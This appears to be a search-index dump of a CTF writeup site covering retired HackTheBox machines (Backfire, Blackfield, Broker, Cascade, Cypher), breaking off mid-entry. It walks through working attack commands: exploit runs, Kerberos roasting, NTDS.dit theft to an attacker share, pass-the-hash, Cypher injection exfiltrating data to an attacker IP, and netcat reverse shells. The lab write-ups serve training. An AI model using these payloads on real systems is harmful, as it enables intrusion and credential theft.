{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"CTF Writeups &amp; Security Research <p>This repository is intended to be reference for various cybersecurity challenges, methodologies, and tools</p> <p>\u26a0\ufe0f Note: Writeups for active machines are censored in accordance with platform rules. Content is only published once the machine has been officially retired.</p> Platform Collections <p>Writeups are categorized by their respective cybersecurity platforms:</p> <ul> <li>HackTheBox (HTB)   Solutions and technical breakdowns for retired machines and selected challenges.</li> <li>Proving Grounds (PG)   Step-by-step walkthroughs for completed machines.</li> </ul> Machine Overview"},{"location":"htb/","title":"HackTheBox Challenges","text":""},{"location":"htb/backfire/","title":"Backfire","text":""},{"location":"htb/backfire/#initial-reconnaissance","title":"Initial Reconnaissance","text":""},{"location":"htb/backfire/#port-enumeration","title":"Port Enumeration","text":"<p>Investigating port <code>8000</code> revealed two interesting files:</p> <ul> <li><code>havoc.yaotl</code></li> <li><code>disable_tls.patch</code></li> </ul> <p>These files appeared to be related to a Havoc C2 listener.</p> <p>Inspecting <code>havoc.yaotl</code> uncovered credentials for users <code>ilya</code> and <code>sergej</code>. Despite obtaining these credentials, I was initially unable to access SSH.</p>"},{"location":"htb/backfire/#exploitation-via-cve-2024-41570-havoc-c2-ssrf-to-rce","title":"Exploitation via CVE-2024-41570 (Havoc C2 SSRF to RCE)","text":"<p>I realized there might be an SSRF to RCE vulnerability exploitable via Havoc C2. Leveraging CVE-2024-41570, I used the previously obtained credentials to exploit the server:</p> <pre><code>python3 exploit.py -t https://backfire.htb -i 127.0.0.1 -p 40056 -U 'ilya' -P 'CobaltStr1keSuckz!' -l 10.10.16.37 -L 3001\n</code></pre> <p>This successfully granted me shell access as the user <code>ilya</code>. However, the shell was unstable and frequently disconnected.</p> <p>To ensure a stable connection, I decided to generate an SSH key pair and authorize it for user <code>ilya</code>:</p> <pre><code>ssh-keygen\neval \"$(ssh-agent -s)\"\nssh-add ~/.ssh/id_rsa\ncat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\nchmod 700 ~/.ssh\n</code></pre> <p>After this, I was able to log in reliably via SSH:</p> <pre><code>ssh ilya@backfire.htb -i ~/.ssh/id_rsa\n</code></pre>"},{"location":"htb/backfire/#lateral-movement-via-hardhatc2","title":"Lateral Movement via HardhatC2","text":"<p>While enumerating accessible ports and files, I noticed evidence indicating user <code>sergej</code> was running a HardhatC2 server. I suspected this might be leveraged for lateral movement.</p> <p>To interact with HardhatC2, I performed SSH port forwarding:</p> <pre><code>ssh -L 7096:localhost:7096 -L 5000:localhost:5000 -L 40056:localhost:40056 ilya@backfire.htb -i ~/.ssh/id_rsa\n</code></pre> <p>Port <code>7096</code> was identified as the login panel for HardhatC2.</p>"},{"location":"htb/backfire/#exploiting-hardhatc2-via-jwt-vulnerability","title":"Exploiting HardhatC2 via JWT Vulnerability","text":"<p>I found an article detailing how static JWT keys in HardhatC2 could be exploited to create an administrator account:</p> <ul> <li>Reference: HardhatC2 0-days RCE &amp; Auth Bypass</li> </ul> <p>Following the provided script, I successfully forged an admin JWT and gained access to the HardhatC2 administrative interface. From there, I executed commands using the terminal functionality in the implants section.</p> <p>Again, I added my SSH key for stable access, this time for user <code>sergej</code>.</p>"},{"location":"htb/backfire/#privilege-escalation-to-root","title":"Privilege Escalation to Root","text":"<p>Checking <code>sergej</code>'s privileges revealed the ability to execute SUID binaries <code>iptables</code> and <code>iptables-save</code> as root. Given this capability, I attempted to escalate privileges by injecting my SSH key using iptables comments and saving these rules directly into the root\u2019s authorized SSH keys.</p> <p>Initially, overwriting <code>/etc/passwd</code> and <code>/etc/passwd.bak</code> wasn't effective because a cron job reverted changes. Instead, I focused on injecting an SSH key directly:</p> <pre><code>sudo /usr/sbin/iptables -A INPUT -i lo -m comment --comment $'\\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAkuGVr+yFcYjNBCeizGyvCbi7x0vBFoVO7sjqhy0SXl gg@pop-os\\n' -j ACCEPT\nsudo iptables-save -f /root/.ssh/authorized_keys\n</code></pre> <p>This successfully injected my SSH key into the root user's authorized keys file.</p>"},{"location":"htb/backfire/#accessing-root-via-ssh","title":"Accessing Root via SSH","text":"<p>With my key injected, I logged in as root:</p> <pre><code>ssh root@backfire.htb -i ~/.ssh/id_ed25519\n</code></pre> <p>Now with full access, I verified the privilege escalation was successful:</p> <pre><code>root@backfire:~# ls\na.txt  root.txt\n</code></pre> <p>This concluded my successful compromise and privilege escalation of the target.</p>"},{"location":"htb/blackfield/","title":"Blackfield - Writeup","text":""},{"location":"htb/blackfield/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/blackfield/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed standard Active Directory services: <pre><code>PORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos\n135/tcp  open  msrpc         Microsoft Windows RPC\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP\n445/tcp  open  microsoft-ds?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP\n</code></pre></p>"},{"location":"htb/blackfield/#domain-information","title":"Domain Information","text":"<p>From the scan results, I identified domain information: <pre><code>Domain: BLACKFIELD.local\nDomain Controller: DC01.BLACKFIELD.local\n</code></pre></p>"},{"location":"htb/blackfield/#smb-enumeration","title":"SMB Enumeration","text":"<p>I checked for SMB access with null and guest authentication: <pre><code>crackmapexec smb 10.129.229.17 -u '' -p ''\ncrackmapexec smb 10.129.229.17 -u 'Guest' -p ''\n</code></pre></p> <p>Guest authentication revealed access to a \"profiles$\" share: <pre><code>smbclient //10.129.229.17/profiles$ -U Guest\n</code></pre></p> <p>This share contained numerous directories named after potential usernames. I extracted these usernames for further attacks: <pre><code>smbclient //10.129.229.17/profiles$ -U Guest -c \"ls\" | awk '{print $1}' &gt; users.txt\n</code></pre></p>"},{"location":"htb/blackfield/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"htb/blackfield/#as-rep-roasting","title":"AS-REP Roasting","text":"<p>With the user list in hand, I attempted AS-REP Roasting to identify users with Kerberos pre-authentication disabled: <pre><code>GetNPUsers.py BLACKFIELD.LOCAL/ -usersfile users.txt -dc-ip 10.129.229.17 -no-pass\n</code></pre></p> <p>This revealed a hash for the \"support\" user: <pre><code>$krb5asrep$23$support@BLACKFIELD.LOCAL:b3db2df37b67a1b8ae5639d98bacaf27$e1203eeede294e058990c0ab70ef72087b38608fbfd36cbbab4416999f92e4b84b44ec41bf4cafdaadeeb394f4183625541ebebf4ece454878392e9f98e19014528f687e6c98edc578c6c99bb35b37cd582d17b423368cf1c6e223495ab2a39158a2d34927280532c5dec7b00c01b058a2cea204e1a96c81e18cb78feef82ad51cc58a596c95b10c8ad889665a3f61b4381fc63387d52c957e2f2d7bf1178a64a3f5e4cd2a7c1513e1c26d8fe809f6693af17fad6749cd896967ff288bcf9d7202f28fb00716357fa483ec2ace48204fcdc9b002cdb32806e85fb33405e8c501dfc79734d5745cb973f798b4674c1de93e5ab9ad\n</code></pre></p>"},{"location":"htb/blackfield/#password-cracking","title":"Password Cracking","text":"<p>I used Hashcat to crack the hash: <pre><code>hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>This revealed valid credentials: - Username: support - Password: #00^BlackKnight</p>"},{"location":"htb/blackfield/#bloodhound-enumeration","title":"BloodHound Enumeration","text":"<p>I used BloodHound to map the domain and identify attack paths: <pre><code>bloodhound-python -c All -u support -p '#00^BlackKnight' -d BLACKFIELD.LOCAL -dc DC01.BLACKFIELD.LOCAL -ns 10.129.229.17\n</code></pre></p> <p>Analysis of the BloodHound data revealed that the \"support\" user had the ability to change passwords for the \"audit2020\" user.</p>"},{"location":"htb/blackfield/#lateral-movement","title":"Lateral Movement","text":""},{"location":"htb/blackfield/#password-reset","title":"Password Reset","text":"<p>I used the support account's privileges to reset the password for audit2020: <pre><code>net rpc password \"audit2020\" \"Dolphin1\" -U \"blackfield.local\"/\"support\"%\"#00^BlackKnight\" -S \"dc01.blackfield.local\"\n</code></pre></p>"},{"location":"htb/blackfield/#share-enumeration","title":"Share Enumeration","text":"<p>With the new credentials, I enumerated accessible shares: <pre><code>crackmapexec smb 10.129.229.17 -u 'audit2020' -p 'Dolphin1' --shares\n</code></pre></p> <p>This revealed several shares, including an interesting \"forensic\" share: <pre><code>SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.\n</code></pre></p>"},{"location":"htb/blackfield/#memory-dump-analysis","title":"Memory Dump Analysis","text":"<p>I connected to the forensic share and found a memory dump file: <pre><code>smbclient //10.129.229.17/forensic -U 'audit2020%Dolphin1'\nget lsass.DMP\n</code></pre></p> <p>I analyzed the memory dump using pypykatz: <pre><code>pypykatz lsa minidump lsass.DMP\n</code></pre></p> <p>This revealed credentials for the \"svc_backup\" user: - Username: svc_backup - NT Hash: 9658d1d1dcd9250115e2205d9f48400d</p>"},{"location":"htb/blackfield/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb/blackfield/#windows-backup-privileges","title":"Windows Backup Privileges","text":"<p>I connected to the target using the svc_backup account with pass-the-hash: <pre><code>evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -u 'svc_backup' -i 10.129.229.17\n</code></pre></p> <p>Through BloodHound analysis, I discovered that svc_backup was a member of the \"Backup Operators\" group, which has significant privileges including the ability to read any file on the system regardless of ACLs.</p>"},{"location":"htb/blackfield/#setting-up-smb-server","title":"Setting Up SMB Server","text":"<p>I set up an SMB server on my attack machine to receive the backup files: <pre><code>impacket-smbserver smb . -smb2support -username smb -password pass\n</code></pre></p>"},{"location":"htb/blackfield/#domain-controller-backup","title":"Domain Controller Backup","text":"<p>On the target, I mounted my SMB share and performed a backup of the NTDS.dit file: <pre><code>net use k: \\\\10.10.16.42\\smb /user:smb pass\necho \"Y\" | wbadmin start backup -backuptarget:\\\\10.10.16.42\\smb -include:c:\\windows\\ntds\n</code></pre></p> <p>I then identified the backup version and initiated recovery: <pre><code>wbadmin get versions\necho \"Y\" | wbadmin start recovery -version:11/19/2024-01:15 -itemtype:file -items:c:\\windows\\ntds\\ntds.dit -recoverytarget:c:\\ -notrestoreacl\n</code></pre></p>"},{"location":"htb/blackfield/#registry-hive-extraction","title":"Registry Hive Extraction","text":"<p>I also extracted the SYSTEM registry hive: <pre><code>reg save HKLM\\SYSTEM C:\\system.hive\n</code></pre></p> <p>And copied both files back to my attack machine: <pre><code>copy C:\\ntds.dit \\\\10.10.16.42\\smb\\ntds.dit\ncopy C:\\system.hive \\\\10.10.16.42\\smb\\system.hive\n</code></pre></p>"},{"location":"htb/blackfield/#extracting-domain-hashes","title":"Extracting Domain Hashes","text":"<p>Using Impacket's secretsdump, I extracted all domain hashes: <pre><code>impacket-secretsdump -ntds ntds.dit -system system.hive local\n</code></pre></p> <p>This revealed the Administrator hash: <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::\n</code></pre></p>"},{"location":"htb/blackfield/#domain-admin-access","title":"Domain Admin Access","text":"<p>With the Administrator hash, I performed a pass-the-hash attack to gain domain admin access: <pre><code>evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u 'Administrator' -i 10.129.229.17\n</code></pre></p> <p>This provided full administrative access to the domain controller, successfully completing the challenge.</p>"},{"location":"htb/broker/","title":"Broker - Writeup","text":""},{"location":"htb/broker/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/broker/#port-scanning","title":"Port Scanning","text":"<p>A basic port scan revealed only two open ports: <pre><code>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  basic realm=ActiveMQRealm\n|_http-title: Error 401 Unauthorized\n</code></pre></p>"},{"location":"htb/broker/#web-enumeration","title":"Web Enumeration","text":"<p>Upon accessing the web server on port 80, I was presented with a basic HTTP authentication prompt: <pre><code>WWW-Authenticate: Basic realm=\"ActiveMQRealm\"\n</code></pre></p> <p>This indicated that Apache ActiveMQ was running on the server, which is a popular message broker application.</p>"},{"location":"htb/broker/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"htb/broker/#default-credentials","title":"Default Credentials","text":"<p>I attempted to use common default credentials for ActiveMQ: <pre><code>curl -v -u admin:admin http://10.129.230.87\n</code></pre></p> <p>This was successful, confirming that the server was using default credentials: - Username: admin - Password: admin</p>"},{"location":"htb/broker/#service-version-identification","title":"Service Version Identification","text":"<p>After authenticating, I examined the web interface to determine the ActiveMQ version: <pre><code>curl -s -u admin:admin http://10.129.230.87 | grep -i version\n</code></pre></p> <p>This revealed that ActiveMQ version 5.15.0 was running on the server.</p>"},{"location":"htb/broker/#vulnerability-research","title":"Vulnerability Research","text":"<p>Research indicated that ActiveMQ 5.15.0 is vulnerable to a critical remote code execution vulnerability, identified as CVE-2023-46604. This vulnerability allows an attacker to send specially crafted serialized data to the OpenWire protocol port, leading to remote code execution.</p>"},{"location":"htb/broker/#exploit-development","title":"Exploit Development","text":"<p>I used a publicly available exploit for CVE-2023-46604: <pre><code>git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git\ncd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ\n</code></pre></p> <p>I prepared the exploit with my attack machine's IP and a chosen port for the reverse shell: <pre><code>python3 activemq-exploit.py -i 10.10.14.15 -p 4444 -t http://10.129.230.87\n</code></pre></p> <p>I set up a listener to catch the reverse shell: <pre><code>nc -lvnp 4444\n</code></pre></p> <p>After executing the exploit, I received a shell as the <code>activemq</code> user, confirming successful exploitation of the vulnerability.</p>"},{"location":"htb/broker/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb/broker/#sudo-permission-enumeration","title":"Sudo Permission Enumeration","text":"<p>I checked for sudo permissions available to the activemq user: <pre><code>sudo -l\n</code></pre></p> <p>This revealed that the activemq user could run nginx as root without a password: <pre><code>User activemq may run the following commands on broker:\n    (root) NOPASSWD: /usr/sbin/nginx\n</code></pre></p>"},{"location":"htb/broker/#nginx-configuration-exploitation","title":"Nginx Configuration Exploitation","text":"<p>Nginx runs with the permissions of the user specified in its configuration file. By creating a custom configuration file that specifies the root user and setting up a WebDAV server, I could gain write access to the filesystem as root.</p> <p>I created a malicious nginx configuration file: <pre><code>cat &lt;&lt; EOF &gt; /tmp/nginx_pwn.conf\nuser root;\nworker_processes 4;\npid /tmp/nginx.pid;\nevents {\n        worker_connections 768;\n}\nhttp {\n        server {\n                listen 1339;\n                root /;\n                autoindex on;\n                dav_methods PUT;\n        }\n}\nEOF\n</code></pre></p> <p>I started nginx with this configuration: <pre><code>sudo nginx -c /tmp/nginx_pwn.conf\n</code></pre></p>"},{"location":"htb/broker/#ssh-key-generation-and-deployment","title":"SSH Key Generation and Deployment","text":"<p>I generated an SSH key pair: <pre><code>ssh-keygen -t rsa -f /tmp/pwn_key -N \"\"\n</code></pre></p> <p>Using the WebDAV PUT method, I added my public key to the root user's authorized_keys file: <pre><code>curl -X PUT localhost:1339/root/.ssh/authorized_keys -d \"$(cat /tmp/pwn_key.pub)\"\n</code></pre></p>"},{"location":"htb/broker/#root-access","title":"Root Access","text":"<p>With the SSH key in place, I connected to the server as root: <pre><code>ssh -i /tmp/pwn_key root@localhost\n</code></pre></p> <p>I verified my access. <pre><code>id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre></p> <p>This confirmed full root access!</p>"},{"location":"htb/cascade/","title":"Cascade - Writeup","text":""},{"location":"htb/cascade/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/cascade/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed standard Active Directory services: <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP\n445/tcp   open  microsoft-ds  \n636/tcp   open  tcpwrapped    \n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP\n3269/tcp  open  tcpwrapped    \n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n</code></pre></p>"},{"location":"htb/cascade/#domain-information","title":"Domain Information","text":"<p>From the scan results, I identified domain information: <pre><code>Domain: cascade.local\nDomain Controller: CASC-DC1.cascade.local\n</code></pre></p>"},{"location":"htb/cascade/#ldap-enumeration","title":"LDAP Enumeration","text":"<p>I performed LDAP enumeration to gather information about users and potential credentials: <pre><code>python3 windapsearch.py --dc-ip 10.129.139.161 --full -U\n</code></pre></p> <p>Then, I searched specifically for password-related attributes: <pre><code>python3 windapsearch.py --dc-ip 10.129.139.161 --full -U | grep -ie \"pwd\\|password\"\n</code></pre></p> <p>This revealed an interesting attribute: <pre><code>cascadeLegacyPwd: clk0bjVldmE=\n</code></pre></p>"},{"location":"htb/cascade/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"htb/cascade/#credential-discovery-and-decoding","title":"Credential Discovery and Decoding","text":"<p>The cascadeLegacyPwd attribute appeared to be base64 encoded. I decoded it: <pre><code>echo -n \"clk0bjVldmE=\" | base64 -d\n</code></pre></p> <p>This revealed the password: <code>rY4n5eva</code></p> <p>Initially, I didn't know which user this password belonged to, so I created a list of potential usernames from the LDAP enumeration results and attempted to brute force: <pre><code>crackmapexec smb 10.129.139.161 -u users.txt -p 'rY4n5eva'\n</code></pre></p> <p>This revealed valid credentials: - Username: r.thompson - Password: rY4n5eva</p>"},{"location":"htb/cascade/#smb-share-enumeration","title":"SMB Share Enumeration","text":"<p>Using these credentials, I connected to SMB shares: <pre><code>smbclient.py cascade.local/r.thompson:'rY4n5eva'@10.129.139.161\n</code></pre></p> <p>I discovered several interesting files: 1. Meeting_Notes_June_2018.html    - Contained information about a 'TempAdmin' account    - Mentioned that TempAdmin had the same password as the Administrator account    - This account had been deleted but could potentially be recovered</p> <ol> <li>VNC Install.reg</li> <li>Contained registry information for TightVNC Server</li> <li>Included an encrypted password: <code>\"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f</code></li> </ol>"},{"location":"htb/cascade/#vnc-password-decryption","title":"VNC Password Decryption","text":"<p>I used a VNC password decryption tool to decrypt the password: <pre><code>python2 vncpasswd.py -d 6bcf2a4b6e5aca0f -H\n</code></pre></p> <p>This revealed a new password: <code>sT333ve2</code></p>"},{"location":"htb/cascade/#lateral-movement","title":"Lateral Movement","text":""},{"location":"htb/cascade/#access-as-ssmith","title":"Access as s.smith","text":"<p>I attempted to use the VNC password with user s.smith: <pre><code>evil-winrm -i 10.129.139.161 -u s.smith -p 'sT333ve2'\n</code></pre></p> <p>This provided access as s.smith.</p>"},{"location":"htb/cascade/#further-enumeration","title":"Further Enumeration","text":"<p>As s.smith, I connected to SMB to explore additional shares: <pre><code>smbclient.py cascade.local/s.smith:'sT333ve2'@10.129.139.161\n</code></pre></p> <p>I discovered an Audit$ share containing an SQLite database named Audit.db: <pre><code>get Audit.db\n</code></pre></p>"},{"location":"htb/cascade/#database-analysis","title":"Database Analysis","text":"<p>I analyzed the database using SQLite Browser and found a table named 'ldap' containing credential information: <pre><code>Username: ArkSvc\nPassword: BQO5l5Kj9MdErXx6Q6AGOw==\nDomain: cascade.local\n</code></pre></p> <p>The password appeared to be encrypted. Simple base64 decoding didn't yield usable results.</p>"},{"location":"htb/cascade/#reverse-engineering-the-encryption","title":"Reverse Engineering the Encryption","text":"<p>I decompiled a related binary found in the Audit share to understand the encryption mechanism. Using ILSpy, I discovered it was using AES encryption with: <pre><code>IV: 1tdyjCbY1Ix49842 (hex: 317464796a4362593149783439383432)\nKey: c4scadek3y654321 (hex: 633473636164656b3379363534333231)\n</code></pre></p> <p>Using this information, I decrypted the password: <pre><code>python3 -c \"from Crypto.Cipher import AES; import base64; key=b'c4scadek3y654321'; iv=b'1tdyjCbY1Ix49842'; cipher=AES.new(key,AES.MODE_CBC,iv); print(cipher.decrypt(base64.b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')).decode('utf-8'))\"\n</code></pre></p> <p>This revealed the credentials: - Username: arksvc - Password: w3lc0meFr31nd</p>"},{"location":"htb/cascade/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb/cascade/#ad-recycle-bin-enumeration","title":"AD Recycle Bin Enumeration","text":"<p>I discovered that the arksvc user was a member of the \"AD Recycle Bin\" group, which allows viewing deleted AD objects. I connected with the new credentials: <pre><code>evil-winrm -i 10.129.139.161 -u arksvc -p 'w3lc0meFr31nd'\n</code></pre></p> <p>Then used PowerShell to search for deleted objects: <pre><code>Get-ADObject -ldapfilter \"(&amp;(ObjectClass=user)(isDeleted=TRUE))\" -IncludeDeletedObjects\n</code></pre></p> <p>This revealed the deleted TempAdmin account with an interesting attribute: <pre><code>cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz\n</code></pre></p>"},{"location":"htb/cascade/#decoding-the-administrator-password","title":"Decoding the Administrator Password","text":"<p>I decoded the discovered base64 string: <pre><code>echo -n \"YmFDVDNyMWFOMDBkbGVz\" | base64 -d\n</code></pre></p> <p>This revealed the password: <code>baCT3r1aN00dles</code></p> <p>According to the earlier notes, TempAdmin shared the same password as Administrator, so I attempted to login as Administrator: <pre><code>evil-winrm -i 10.129.139.161 -u Administrator -p 'baCT3r1aN00dles'\n</code></pre></p> <p>This provided access as Administrator, successfully completing the challenge.</p> <p>I verified the access by checking administrative privileges: <pre><code>whoami /all\n</code></pre></p>"},{"location":"htb/cypher/","title":"Cypher","text":""},{"location":"htb/cypher/#initial-reconnaissance","title":"Initial Reconnaissance","text":""},{"location":"htb/cypher/#whatweb-results","title":"WhatWeb Results","text":"<pre><code>Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], \nIP[10.129.10.93], JQuery[3.6.1], Script, Title[GRAPH ASM], nginx[1.24.0]\n</code></pre>"},{"location":"htb/cypher/#interesting-directories","title":"Interesting Directories","text":"<ul> <li><code>/api/auth</code></li> <li><code>/testing</code></li> </ul>"},{"location":"htb/cypher/#neo4j-cypher-injection-analysis","title":"Neo4j Cypher Injection Analysis","text":""},{"location":"htb/cypher/#initial-testing","title":"Initial Testing","text":"<p>Upon discovering the application was using Neo4j, I began testing for Cypher injection vulnerabilities. I set up an HTTP web server to receive query results and found that the <code>username</code> parameter was injectable, while the <code>password</code> parameter was not.</p>"},{"location":"htb/cypher/#enumerating-database-schema","title":"Enumerating Database Schema","text":"<p>I injected the following query to retrieve all database labels: <pre><code>' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.17/?label='+label as l RETURN 0 as _0 //\n</code></pre></p>"},{"location":"htb/cypher/#web-server-log-results","title":"Web Server Log Results","text":"<pre><code>\u279c  ~ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.129.10.93 - - [25/Apr/2025 10:18:44] \"GET /?label=USER HTTP/1.1\" 200 -\n10.129.10.93 - - [25/Apr/2025 10:18:46] \"GET /?label=HASH HTTP/1.1\" 200 -\n10.129.10.93 - - [25/Apr/2025 10:18:48] \"GET /?label=DNS_NAME HTTP/1.1\" 200 -\n10.129.10.93 - - [25/Apr/2025 10:18:50] \"GET /?label=SHA1 HTTP/1.1\" 200 -\n10.129.10.93 - - [25/Apr/2025 10:18:54] \"GET /?label=SCAN HTTP/1.1\" 200 -\n10.129.10.93 - - [25/Apr/2025 10:18:55] \"GET /?label=ORG_STUB HTTP/1.1\" 200 -\n10.129.10.93 - - [25/Apr/2025 10:18:58] \"GET /?label=IP_ADDRESS HTTP/1.1\" 200 -\n</code></pre>"},{"location":"htb/cypher/#extracting-user-information","title":"Extracting User Information","text":"<p>Next, I extracted user and hash information using the following payload: <pre><code>' OR 1=1 WITH 1 as a MATCH (h:SHA1) UNWIND keys(h) as p LOAD CSV FROM 'http://10.10.16.17/?' + p +'='+toString(h[p]) as l RETURN 0 as _0 //\n</code></pre></p>"},{"location":"htb/cypher/#response","title":"Response","text":"<pre><code>10.129.10.93 - - [25/Apr/2025 10:27:45] \"GET /?value=graphasm HTTP/1.1\" 200 -\n10.129.10.93 - - [25/Apr/2025 10:29:40] \"GET /?value=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1\" 200 -\n</code></pre>"},{"location":"htb/cypher/#understanding-the-query-structure","title":"Understanding the Query Structure","text":"<p>By forcing an error, I was able to understand the original query structure: <pre><code>message: Query cannot conclude with MATCH (must be a RETURN clause, a FINISH clause, an update clause, a unit subquery call, or a procedure call with no YIELD). (line 1, column 1 (offset: 0))\n\"MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = ''//' return h.value as hash\"\n</code></pre></p>"},{"location":"htb/cypher/#custom-apoc-extension-analysis","title":"Custom APOC Extension Analysis","text":"<p>After standard authentication bypass techniques failed, I investigated further and found a JAR file in the <code>/testing</code> directory named <code>custom-apoc-extension-1.0-SNAPSHOT.jar</code>. This appeared to be a custom APOC extension for Neo4j.</p>"},{"location":"htb/cypher/#decompiling-and-analyzing-the-jar","title":"Decompiling and Analyzing the JAR","text":"<p>Upon decompiling, I found the <code>CustomFunctions.java</code> class which contained a single function called <code>getUrlStatusCode</code>: <pre><code>@Procedure(\nname = \"custom.getUrlStatusCode\",\nmode = Mode.READ\n)\n@Description(\"Returns the HTTP status code for the given URL as a string\"\npublic Stream&lt;CustomFunctions.StringOutput&gt; getUrlStatusCode(@Name(\"url\") String url) throws Exception {\nif (!url.toLowerCase().startsWith(\"http://\") &amp;&amp; !url.toLowerCase().startsWith(\"https://\")) {\n    url = \"https://\" + url;\n}\n</code></pre> This function automatically appends <code>https://</code> to URLs that don't start with a protocol. However, the critical vulnerability was in the command execution: <pre><code>String[] command = new String[]{\"/bin/sh\", \"-c\", \"curl -s -o /dev/null --connect-timeout 1 -w %{http_code} \" + url};\n</code></pre> There was no input sanitization on the <code>url</code> parameter, creating a command injection vulnerability.</p>"},{"location":"htb/cypher/#exploiting-command-injection","title":"Exploiting Command Injection","text":""},{"location":"htb/cypher/#testing-command-execution","title":"Testing Command Execution","text":"<p>I crafted a Cypher query to execute <code>whoami</code> and send the result back to my web server: <pre><code>' OR 1=1 WITH 1 as a CALL custom.getUrlStatusCode('; whoami') yield statusCode LOAD CSV FROM 'http://10.10.16.17/?label='+statusCode as l RETURN 0 as _0 //\n</code></pre></p>"},{"location":"htb/cypher/#response_1","title":"Response","text":"<p><pre><code>10.129.231.244 - - [26/Apr/2025 08:31:47] \"GET /?label=000neo4j HTTP/1.1\" 200 -\n</code></pre> This confirmed the command injection vulnerability worked, showing the command was run as user <code>neo4j</code>.</p>"},{"location":"htb/cypher/#obtaining-a-reverse-shell","title":"Obtaining a Reverse Shell","text":"<p>With command execution confirmed, I created a payload to obtain a reverse shell: <pre><code>' OR 1=1 WITH 1 as a CALL custom.getUrlStatusCode('; busybox nc 10.10.16.17 9001 -e sh') yield statusCode LOAD CSV FROM 'http://10.10.16.17/?label='+statusCode as l RETURN 0 as _0 //\n</code></pre> I started a listener on port 9001 using <code>nc -lvnp 9001</code> and received a connection. I upgraded the shell using Python: <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre></p>"},{"location":"htb/cypher/#post-exploitation","title":"Post-Exploitation","text":""},{"location":"htb/cypher/#discovering-credentials","title":"Discovering Credentials","text":"<p>As user <code>neo4j</code>, I examined the <code>.bash_history</code> file and found database credentials: <pre><code>cat /var/lib/neo4j/.bash_history\nneo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK\n</code></pre></p>"},{"location":"htb/cypher/#privilege-escalation-to-user-graphasm","title":"Privilege Escalation to User graphasm","text":"<p>I ran LinPEAS to search for additional information and discovered another user named <code>graphasm</code>. I tested the previously found password with this user: <pre><code>su graphasm\n# Password: cU4btyib.20xtCMCXkBmerhK\n</code></pre> Successfully logged in as <code>graphasm</code>, I established an SSH session for better stability.</p>"},{"location":"htb/cypher/#privilege-escalation-to-root","title":"Privilege Escalation to Root","text":""},{"location":"htb/cypher/#discovering-sudo-permissions","title":"Discovering sudo Permissions","text":"<p>I checked sudo permissions for user <code>graphasm</code>: <pre><code>sudo -l\n</code></pre></p>"},{"location":"htb/cypher/#output","title":"Output","text":"<p><pre><code>Matching Defaults entries for graphasm on cypher:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\nUser graphasm may run the following commands on cypher:\n    (ALL) NOPASSWD: /usr/local/bin/bbot\n</code></pre> This showed that I could run the <code>bbot</code> binary as root without a password.</p>"},{"location":"htb/cypher/#researching-bbot","title":"Researching BBOT","text":"<p>Research revealed that BBOT is a modular OSINT tool that allows loading custom modules. The documentation provided 